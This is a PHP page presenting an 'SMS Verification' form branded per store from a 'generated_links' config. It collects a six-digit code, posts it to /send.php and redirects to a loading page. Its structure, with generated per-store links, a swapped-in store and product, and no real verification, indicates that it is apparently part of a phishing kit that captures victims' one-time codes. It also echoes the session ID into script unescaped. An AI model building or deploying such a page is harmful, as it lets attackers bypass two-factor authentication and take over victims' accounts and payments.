<?php
session_start();

// Load config file
$config = require __DIR__ . '/config.php';

// Get store ID from session
$storeId = $_SESSION['current_store_id'] ?? null;

// Load specific store configuration if available
if ($storeId && isset($config['generated_links'][$storeId])) {
    $storeConfig = $config['generated_links'][$storeId];
    $config['store'] = $storeConfig['store'];
    $config['product'] = $storeConfig['product'];
}

require_once 'functions.php';
$sessionId = $_SESSION['unique_id'] ?? '(not set)';

// Debug - check what we're getting from config
error_log('Theme color from config: ' . ($config['store']['theme_color'] ?? 'not set'));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full">
        <div class="text-center mb-8">
            <h2 class="text-2xl font-bold text-gray-900 mb-2">SMS Verification Required</h2>
            <p class="text-gray-600">Please enter the verification code sent to your phone</p>
        </div>

        <div class="bg-white rounded-lg shadow-lg p-8">
            <form id="smsForm" class="space-y-6">
                <!-- SMS Input Fields -->
                <div class="flex gap-2 justify-center">
                    <?php for($i = 0; $i < 6; $i++): ?>
                    <input type="text" 
                           maxlength="1" 
                           class="w-12 h-12 text-center text-2xl border rounded-md focus:outline-none focus:ring-2 focus:ring-[<?php echo htmlspecialchars($config['store']['theme_color']); ?>] focus:border-[<?php echo htmlspecialchars($config['store']['theme_color']); ?>]" 
                           required>
                    <?php endfor; ?>
                </div>

                <!-- Timer -->
                <div class="text-center text-sm text-gray-500">
                    <span id="timer" class="font-medium text-[<?php echo htmlspecialchars($config['store']['theme_color']); ?>]">02:00</span> remaining
                </div>

                <!-- Verify Button -->
                <button type="submit" 
                        id="verifyBtn" 
                        class="w-full bg-[<?php echo htmlspecialchars($config['store']['theme_color']); ?>] text-white py-4 rounded-md text-lg font-medium hover:opacity-90 transition-colors relative">
                    <div class="flex items-center justify-center">
                        <span id="verifyText">Verify Code</span>
                        <span id="verifySpinner" class="absolute opacity-0 transition-opacity">
                            <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                        </span>
                    </div>
                </button>

                <!-- Resend Code -->
                <div class="text-center">
                    <button type="button" 
                            id="resendBtn" 
                            class="text-[<?php echo htmlspecialchars($config['store']['theme_color']); ?>] hover:underline">
                        Resend Code
                    </button>
                </div>

                <!-- Error Message -->
                <div id="errorMessage" class="text-red-500 text-sm text-center mt-2 hidden"></div>
            </form>
        </div>
    </div>

    <script>
        // Handle input boxes
        const inputs = document.querySelectorAll('input');
        inputs.forEach((input, index) => {
            // Auto-focus next input
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            // Handle backspace
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        // Timer functionality
        let timeLeft = 120; // 2 minutes in seconds
        const timerElement = document.getElementById('timer');
        const resendBtn = document.getElementById('resendBtn');

        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            
            if (timeLeft === 0) {
                resendBtn.disabled = false;
                resendBtn.style.opacity = '1';
            } else {
                timeLeft--;
                setTimeout(updateTimer, 1000);
            }
        }

        // Start timer
        updateTimer();

        // Handle form submission
        document.getElementById('smsForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = Array.from(inputs).map(input => input.value).join('');
            const verifyText = document.getElementById('verifyText');
            const verifySpinner = document.getElementById('verifySpinner');
            const verifyBtn = document.getElementById('verifyBtn');
            const errorMessage = document.getElementById('errorMessage');

            // Show loading state
            verifyText.style.opacity = '0.5';
            verifySpinner.style.opacity = '1';
            verifyBtn.disabled = true;
            errorMessage.classList.add('hidden');

            try {
                // Send to send.php
                const response = await fetch('/send.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'sms_code',
                        data: {
                            code: code,
                            sessionId: '<?php echo $sessionId; ?>'
                        }
                    })
                });

                const data = await response.json();
                console.log('Response:', data);

                if (data.status === 'success') {
                    // Redirect to loading page immediately
                    window.location.replace('/loading.php');
                    return;
                }

                // If we get here, something went wrong
                throw new Error(data.message || 'Failed to verify code');
            } catch (error) {
                console.error('Error:', error);
                
                // Show error
                errorMessage.textContent = error.message;
                errorMessage.classList.remove('hidden');
                
                // Reset form state
                verifyText.style.opacity = '1';
                verifySpinner.style.opacity = '0';
                verifyBtn.disabled = false;
                
                // Clear inputs
                inputs.forEach(input => input.value = '');
                inputs[0].focus();
            }
        });

        // Handle resend
        resendBtn.addEventListener('click', () => {
            // Reset timer
            timeLeft = 120;
            updateTimer();
            
            // Disable resend button
            resendBtn.disabled = true;
            resendBtn.style.opacity = '0.5';
            
            // Clear inputs
            inputs.forEach(input => input.value = '');
            inputs[0].focus();
        });
    </script>
</body>
</html> 